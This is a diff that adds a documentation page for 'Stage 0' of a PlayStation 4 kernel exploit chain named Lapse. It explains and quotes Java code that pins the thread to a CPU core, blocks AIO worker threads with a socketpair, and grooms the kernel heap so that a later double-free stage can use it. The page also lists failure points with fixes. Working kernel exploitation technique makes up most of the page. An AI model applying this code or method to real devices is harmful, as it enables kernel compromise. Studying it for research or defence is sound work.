@@ -1,0 +1,326 @@
+---
+title: 'Stage 0: Setup'
+description: 'Environment preparation for the exploit chain'
+---
+
+# Stage 0: Setup
+
+Stage 0 prepares the execution environment for reliable exploitation. This stage establishes deterministic timing through CPU pinning, blocks AIO worker threads for controlled execution, and grooms the kernel heap to create predictable memory layouts.
+
+## Overview
+
+Implemented in `Lapse.performSetup()` at `Lapse.java:137-214`.
+
+```java
+public static boolean performSetup() {
+    Status.println("=== STAGE 0: Setup ===");
+    // CPU pinning, worker blocking, heap grooming
+}
+```
+
+## Step 1: CPU Pinning and Priority Setting
+
+### Why CPU Pinning?
+
+Race conditions require precise timing. Running on a dedicated CPU core prevents:
+- Context switches that introduce timing jitter
+- Interference from other system processes
+- Cache eviction from unrelated threads
+
+### Implementation
+
+From `Lapse.java:141-155`:
+
+```java
+// Save previous core for restoration
+previousCore = Helper.getCurrentCore();
+Status.println("Previous core: " + previousCore);
+
+// Pin to core 4 (MAIN_CORE = 4)
+if (!Helper.pinToCore(MAIN_CORE)) {
+    Status.println("Failed to pin to core " + MAIN_CORE);
+    return false;
+}
+
+// Set real-time priority 0x100
+if (!Helper.setRealtimePriority(MAIN_RTPRIO)) {
+    Status.println("Failed to set realtime priority");
+    return false;
+}
+
+Status.println("Pinned to core " + Helper.getCurrentCore() + " with prio " + MAIN_RTPRIO);
+```
+
+<Note>
+**Core 4** is chosen because PlayStation 4's FreeBSD kernel reserves cores 0-3 for system processes. Core 4 provides dedicated execution without system interference.
+</Note>
+
+### Priority Scheduling
+
+The exploit uses **real-time priority 0x100**:
+- Ensures the exploit thread runs before normal priority threads
+- Prevents preemption during critical race windows
+- Guarantees consistent timing across race attempts
+
+## Step 2: Socketpair Creation for Blocking
+
+### Purpose
+
+Creates a UNIX domain socketpair used to block AIO worker threads on demand.
+
+### Implementation
+
+From `Lapse.java:157-160` and `Lapse.java:216-235`:
+
+```java
+// Create socketpair for blocking
+if (!createSocketPair()) {
+    return false;
+}
+
+private static boolean createSocketPair() {
+    try {
+        Buffer sockpair = new Buffer(8);
+        long result = Helper.syscall(Helper.SYS_SOCKETPAIR, 
+                                   (long)Helper.AF_UNIX, 
+                                   (long)Helper.SOCK_STREAM, 0L, 
+                                   sockpair.address());
+        if (result != 0) {
+            Status.println("Socketpair creation failed: " + result);
+            return false;
+        }
+
+        blockFd = sockpair.getInt(0);     // Read end
+        unblockFd = sockpair.getInt(4);   // Write end
+
+        Status.println("Created socketpair: blockFd=" + blockFd + 
+                      " unblockFd=" + unblockFd);
+        return true;
+    } catch (Exception e) {
+        Status.println("Failed to create socketpair: " + e.getMessage());
+        return false;
+    }
+}
+```
+
+### How It Works
+
+1. **blockFd** - Reading from this descriptor will block until data is written
+2. **unblockFd** - Writing to this descriptor unblocks the reader
+3. Used in Stage 1 to control AIO worker thread timing during races
+
+<Warning>
+The socketpair must remain open throughout the exploit. Closing it prematurely will unblock workers and break race conditions.
+</Warning>
+
+## Step 3: AIO Worker Blocking
+
+### Why Block Workers?
+
+The PlayStation 4 kernel maintains a pool of AIO worker threads. These must be blocked to:
+- Prevent premature AIO completion
+- Control exact timing of AIO operations
+- Create race windows between main thread and worker threads
+
+### Implementation
+
+From `Lapse.java:162-181`:
+
+```java
+// Block AIO workers
+Buffer blockReqs = new Buffer(0x28 * NUM_WORKERS);  // NUM_WORKERS = 2
+blockReqs.fill((byte)0);
+
+// Create 2 AIO read requests that will block
+for (int i = 0; i < NUM_WORKERS; i++) {
+    int offset = i * 0x28;  // Size of AIO request structure
+    blockReqs.putInt(offset + 0x08, 1);         // nbyte = 1 (read 1 byte)
+    blockReqs.putInt(offset + 0x20, blockFd);   // fd = blockFd
+}
+
+// Submit blocking AIO requests with HIGH priority
+Buffer blockIdBuf = new Buffer(4);
+long result = Helper.aioSubmitCmd(Helper.AIO_CMD_READ, 
+                                 blockReqs.address(), 
+                                 NUM_WORKERS, 
+                                 Helper.AIO_PRIORITY_HIGH, 
+                                 blockIdBuf.address());
+if (result != 0) {
+    Status.println("Failed to submit blocking AIO: " + result);
+    return false;
+}
+
+blockId = blockIdBuf.getInt(0);
+Status.println("AIO workers blocked with ID: " + blockId);
+```
+
+### AIO Request Structure
+
+Each AIO request is 0x28 bytes:
+
+```
+Offset  Size  Field
+------  ----  -----
+0x00    4     (unused for blocking)
+0x04    4     (unused for blocking)
+0x08    4     nbyte - number of bytes to read (1)
+0x0c    20    (unused for blocking)
+0x20    4     fd - file descriptor (blockFd)
+0x24    4     (unused for blocking)
+```
+
+<Note>
+High priority (Helper.AIO_PRIORITY_HIGH) ensures these requests are assigned to workers immediately, blocking them until data arrives on blockFd.
+</Note>
+
+## Step 4: Heap Grooming
+
+### Purpose
+
+Creates predictable memory layout in the kernel heap by allocating and freeing AIO structures.
+
+### Implementation
+
+From `Lapse.java:183-206`:
+
+```java
+// Heap grooming
+int numReqs = 3;  // 3 requests per batch
+Buffer groomReqs = Helper.createAioRequests(numReqs);
+
+groomIds = new int[NUM_GROOMS];  // NUM_GROOMS = 0x200 (512)
+int validCount = 0;
+
+// Submit 512 batches of 3 AIO requests = 1536 total requests
+for (int i = 0; i < NUM_GROOMS; i++) {
+    Buffer singleId = new Buffer(4);
+    result = Helper.aioSubmitCmd(Helper.AIO_CMD_READ, 
+                               groomReqs.address(), 
+                               numReqs, 
+                               Helper.AIO_PRIORITY_HIGH, 
+                               singleId.address());
+    if (result == 0) {
+        groomIds[i] = singleId.getInt(0);
+        validCount++;
+    } else {
+        groomIds[i] = 0;
+    }
+}
+
+Status.println("Submitted " + validCount + " groom AIOs");
+
+// Cancel grooming AIOs
+cancelGroomAios();
+```
+
+### Why 512 Batches?
+
+- **Memory Fragmentation**: Creates holes in the 0x80 byte memory zone
+- **Predictability**: Establishes known allocation patterns
+- **Reclaim Targets**: Freed slots can be reclaimed in later stages
+
+### Cancellation Process
+
+From `Lapse.java:237-254`:
+
+```java
+private static void cancelGroomAios() {
+    try {
+        Buffer errors = new Buffer(4 * Helper.MAX_AIO_IDS);
+
+        // Cancel in batches (MAX_AIO_IDS per batch)
+        for (int i = 0; i < NUM_GROOMS; i += Helper.MAX_AIO_IDS) {
+            int batchSize = Math.min(Helper.MAX_AIO_IDS, NUM_GROOMS - i);
+            Buffer batchIds = new Buffer(4 * batchSize);
+
+            for (int j = 0; j < batchSize; j++) {
+                batchIds.putInt(j * 4, groomIds[i + j]);
+            }
+
+            Helper.aioMultiCancel(batchIds.address(), batchSize, errors.address());
+        }
+    } catch (Exception e) {
+        Status.println("Error canceling groom AIOs: " + e.getMessage());
+    }
+}
+```
+
+<Warning>
+Canceling (not deleting) the grooms leaves memory in a specific state that Stage 1 exploits. Deleting would free memory immediately; canceling leaves structures allocated but marked as aborted.
+</Warning>
+
+## Memory State After Setup
+
+After Stage 0 completes:
+
+```
+Kernel Heap (0x80 zone):
+┌─────────────────────────────────┐
+│ 512 cancelled AIO batches       │  ← Fragmented, ready for reclaim
+│ (1536 aio_entry structures)     │
+└─────────────────────────────────┘
+
+AIO Worker Threads:
+┌─────────────┐  ┌─────────────┐
+│ Worker 1    │  │ Worker 2    │
+│ BLOCKED     │  │ BLOCKED     │
+│ (on blockFd)│  │ (on blockFd)│
+└─────────────┘  └─────────────┘
+
+Main Thread:
+┌─────────────────────────────────┐
+│ Core: 4                         │
+│ Priority: 0x100 (realtime)      │
+│ Ready for Stage 1               │
+└─────────────────────────────────┘
+```
+
+## Success Criteria
+
+✅ Setup succeeds when:
+1. CPU pinned to core 4 with real-time priority
+2. Socketpair created successfully
+3. All AIO workers blocked on blockFd reads
+4. 512 groom AIO batches submitted and cancelled
+5. No errors during any operation
+
+## Common Failure Points
+
+### Failed to Pin to Core
+
+```
+Failed to pin to core 4
+```
+
+**Cause**: Insufficient privileges or core unavailable  
+**Solution**: Ensure BD-J application has required permissions
+
+### Socketpair Creation Failed
+
+```
+Socketpair creation failed: -1
+```
+
+**Cause**: File descriptor limit reached  
+**Solution**: Close unused descriptors before exploit
+
+### AIO Submit Failed
+
+```
+Failed to submit blocking AIO: -12
+```
+
+**Cause**: Kernel AIO queue full  
+**Solution**: Reboot system to clear AIO state
+
+## Next Stage
+
+With the environment prepared, proceed to:
+
+→ [Stage 1: Double-Free](/technical/stage-1-double-free) - First memory corruption using the prepared heap
+
+## Related Code
+
+- `Lapse.performSetup()` - Main setup function (`Lapse.java:137`)
+- `Lapse.createSocketPair()` - Socketpair creation (`Lapse.java:216`)
+- `Lapse.cancelGroomAios()` - Heap grooming cleanup (`Lapse.java:237`)
